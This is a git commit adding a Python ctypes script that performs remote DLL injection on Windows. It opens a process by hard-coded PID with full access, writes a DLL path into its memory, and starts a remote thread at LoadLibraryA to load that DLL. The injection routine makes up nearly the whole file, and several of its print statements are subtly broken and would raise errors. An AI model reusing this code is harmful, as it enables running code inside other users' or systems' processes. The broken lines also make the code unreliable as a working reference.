00cb674ea331ad0f8b82e0090c3af9d6e16f5e24
Vermiis <nightmare.nira@gmail.com>
2024-02-21 19:21:36 +0100

    projects

---
+++ Projects/RemoteDLLinject.py
@@ -0,0 +1,77 @@
+from ctypes import *
+from ctypes import wintypes
+
+kernel32 = windll.kernel32
+LPCTSTR = c_char_p
+SIZE_T = c_size_t
+
+OpenProcess = kernel32.OpenProcess
+OpenProcess.argtypes = (wintypes.DWORD, wintypes.BOOL, wintypes.DWORD )
+OpenProcess.restype = wintypes.HANDLE
+
+VirtualAllocEx = kernel32.VirtualAllocEx
+VirtualAllocEx.argtypes = (wintypes.HANDLE, wintypes.LPVOID, SIZE_T, wintypes.DWORD, wintypes.DWORD)
+VirtualAllocEx.restype = wintypes.LPVOID
+
+WriteProcessMemory = kernel32.WriteProcessMemory
+WriteProcessMemory.argtypes = (wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, SIZE_T, POINTER(SIZE_T))
+WriteProcessMemory.restype = wintypes.BOOL
+
+GetModuleHandle = kernel32.GetModuleHandleA
+GetModuleHandle.argtypes = (LPCTSTR, )
+GetModuleHandle.restype = wintypes.HANDLE
+
+GetProcAddress = kernel32.GetProcAddress
+GetProcAddress.argtypes = (wintypes.HANDLE, LPCTSTR)
+GetProcAddress.restype = wintypes.LPVOID
+
+class _SECURITY_ATTRIBUTES(Structure):
+    _fields_=[('nLenght', wintypes.DWORD),
+              ('nlSecurityDescriptor', wintypes.LPVOID),
+              ('bInheritHandle', wintypes.BOOL)]
+
+SECURITY_ATTRIBUTES = _SECURITY_ATTRIBUTES
+LPSECURITY_ATTRIBUTES=POINTER(_SECURITY_ATTRIBUTES)
+LPTHREAD_START_ROUTINE = wintypes.LPVOID
+
+CreateRemoteThread = kernel32.CreateRemoteThread
+CreateRemoteThread.argtypes = (wintypes.HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, wintypes.LPVOID, wintypes.DWORD, wintypes.LPDWORD)
+CreateRemoteThread.restype = wintypes.HANDLE
+
+MEM_COMMIT = 0x00001000
+MEM_RESERVE = 0x00002000
+PAGE_READWRITE = 0x04
+EXECUTE_IMMEDIATELY = 0x0
+PROCESS_ALL_ACCESS = (0x000F0000|0x0010000|0x00000FFF)
+
+dll=b"C:\\Users\\Public\\dlltoinject.dll"
+# start process
+# check process ID
+pid = 9380
+
+handle=OpenProcess(PROCESS_ALL_ACCESS, False, pid)
+if not handle:
+    raise WinError()
+
+print("Handle obtained => {0:X}".format(handle))
+
+remote_memory = VirtualAllocEx(handle, False, len(dll) +1, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
+if not remote_memory:
+    raise WinError()
+
+print("Memory allocated => {0:X}".hex(remote_memory))
+
+#write to memory
+write = WriteProcessMemory(handle, remote_memory, dll, len(dll)+1, None)
+if not write:
+    raise WinError()
+print("Bytes written => {0:X}".format(dll))
+
+
+#retreive addr
+
+load_lib = GetProcAddress( GetModuleHandle(b"kernel32.dll"), b"LoadLibraryA")
+print("Load lib addr => {0:X}".hex(load_lib))
+
+rthread = CreateRemoteThread(handle, None, 0, load_lib, remote_memory, EXECUTE_IMMEDIATELY, None)
+#dll executed!
